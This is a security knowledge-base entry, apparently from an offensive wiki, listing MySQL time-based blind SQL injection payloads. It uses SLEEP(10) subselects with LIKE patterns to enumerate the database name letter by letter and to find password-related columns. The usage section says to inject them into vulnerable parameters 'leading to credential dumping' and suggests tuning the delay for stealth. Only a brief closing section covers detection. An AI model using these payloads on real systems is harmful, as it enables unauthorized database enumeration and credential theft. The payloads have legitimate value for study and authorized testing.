---
id: 521d2898-37f6-4066-8d03-ac99042c9ff4
name: mysql-sleep-subselect-extraction-payloads
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:34.688774+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
  - Linux
tags:
  - sql-injection
  - time-based
  - payloads
validated: true
---

# mysql-sleep-subselect-extraction-payloads

## Code

```sql
1 and (select sleep(10) from dual where database() like '%')#
1 and (select sleep(10) from dual where database() like '___')# 
1 and (select sleep(10) from dual where database() like '____')#
1 and (select sleep(10) from dual where database() like '_____')#
1 and (select sleep(10) from dual where database() like 'a____')#
...
1 and (select sleep(10) from dual where database() like 's____')#
1 and (select sleep(10) from dual where database() like 'sa___')#
...
1 and (select sleep(10) from dual where database() like 'sw___')#
1 and (select sleep(10) from dual where database() like 'swa__')#
1 and (select sleep(10) from dual where database() like 'swb__')#
1 and (select sleep(10) from dual where database() like 'swi__')#
...
1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
```

## Description

This code contains a series of SQL payloads for time-based blind injection in MySQL, using SLEEP(10) in a subselect with LIKE operators to extract database names and identify tables/columns with sensitive data (e.g., passwords). Each payload triggers a 10-second delay on true conditions, enabling character-by-character enumeration.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| No variables; payloads use wildcards | LIKE patterns with % (any) and _ (single char) for guessing | database() like 's____' for 5-char DB starting with 's' |
| sleep(10) | Delay duration in seconds; adjustable for stealth | 5 for shorter tests |

## Usage

Inject these payloads sequentially into vulnerable parameters (e.g., via Burp Repeater or curl) after confirming injection. Start with broad patterns to determine length, then refine letters. A delay confirms a match; no delay means false. Use in procedures like [[procedures/mysql-time-based-blind-injection-using-sleep-subselect]] for database enumeration leading to credential dumping.

## Detection

- Monitor database logs for SLEEP function calls or subselects with unusual LIKE patterns.
- WAF rules for timing anomalies or SQL keywords like SLEEP, information_schema.
- Application-level logging of slow queries (>5s) or repeated similar requests from one IP.
